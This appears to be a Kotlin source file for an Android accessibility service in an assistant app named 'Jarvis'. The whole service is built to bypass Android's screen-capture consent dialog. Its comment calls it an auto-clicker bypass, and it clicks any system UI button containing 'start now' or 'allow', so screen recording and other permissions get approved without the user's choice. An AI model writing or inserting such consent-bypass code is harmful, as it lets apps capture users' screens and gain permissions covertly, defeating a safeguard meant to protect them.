package com.ai.assistant.jarvis

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.util.Log

class JarvisAccessibilityService : AccessibilityService() {
    private val TAG = "JarvisAccessibility"

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Jarvis Accessibility Service Connected")
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        }
        this.serviceInfo = info
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        
        // Android 14 MediaProjection "Start Now" Dialog Auto-Clicker Bypass
        if (event.packageName == "com.android.systemui") {
            autoClickStartNow(rootNode)
        }
    }

    private fun autoClickStartNow(node: AccessibilityNodeInfo) {
        if (node.className == "android.widget.Button") {
            val text = node.text?.toString()?.lowercase()
            // Look for "start now", "allow", etc.
            if (text != null && (text.contains("start now") || text.contains("allow"))) {
                Log.d(TAG, "Found MediaProjection prompt, auto-clicking: $text")
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { autoClickStartNow(it) }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Jarvis Accessibility Service Interrupted")
    }
}
